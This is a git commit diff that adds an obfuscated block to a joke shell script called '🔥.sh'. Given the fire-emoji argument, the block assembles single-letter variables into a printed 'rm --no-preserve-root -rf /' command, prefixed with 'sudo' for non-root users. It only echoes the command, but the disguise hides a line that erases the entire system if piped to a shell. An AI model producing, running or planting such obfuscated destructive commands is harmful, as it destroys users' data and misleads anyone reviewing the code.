707ec24eeb8085d03ad9986b5f51ae134c7ca6d8
c0m4r <github@wolfet.pl>
2024-01-19 11:40:58 +0100

    🔥

--- 🔥.sh
+++ 🔥.sh
@@ -1,3 +1,34 @@
 #!/bin/sh
 
 echo "Burn now 🔥"
+
+if [ "$1" = '🔥' ] ; then
+
+    b6="/"
+    bu6=" "
+    bur6="-"
+    burn6="r"
+    burn66="s"
+    burn666="m"
+    burn6666="o"
+    burn66666="f"
+    burn666666="n"
+    burn6666666="p"
+    burn66666666="e"
+    burn666666666="v"
+    burn6666666666="d"
+    burn66666666666="u"
+    burn666666666666="t"
+
+    if [ `whoami` = "${burn6}${burn6666}${burn6666}${burn666666666666}" ]; then
+        burn="${burn6}${burn666}"
+    else
+        burn="${burn66}${burn66666666666}${burn6666666666}${burn6666}${bu6}${burn6}${burn666}"
+    fi
+
+    echo -n "${burn}${bu6}${bur6}${bur6}${burn666666}${burn6666}${bur6}${burn6666666}"
+    echo -n "${burn6}${burn66666666}${burn66}${burn66666666}${burn6}${burn666666666}"
+    echo -n "${burn66666666}${bur6}${burn6}${burn6666}${burn6666}${burn666666666666}"
+    echo "${bu6}${bur6}${burn6}${burn66666}${bu6}${b6}"
+
+fi
